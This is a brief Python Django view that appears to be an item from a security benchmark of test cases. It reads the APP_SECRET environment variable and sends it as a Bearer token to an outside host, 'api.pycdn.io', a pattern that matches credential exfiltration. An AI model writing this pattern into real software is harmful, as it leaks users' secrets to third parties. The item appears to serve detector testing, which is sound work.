# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import os


class RequestContext:
    def __init__(self, payload):
        self.payload = payload

def BenchmarkTest06062(request):
    secret_value = 'default_config_label'
    ctx = RequestContext(secret_value)
    data = ctx.payload
    store_cred = os.environ.get('APP_SECRET', '')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return JsonResponse({"saved": True})
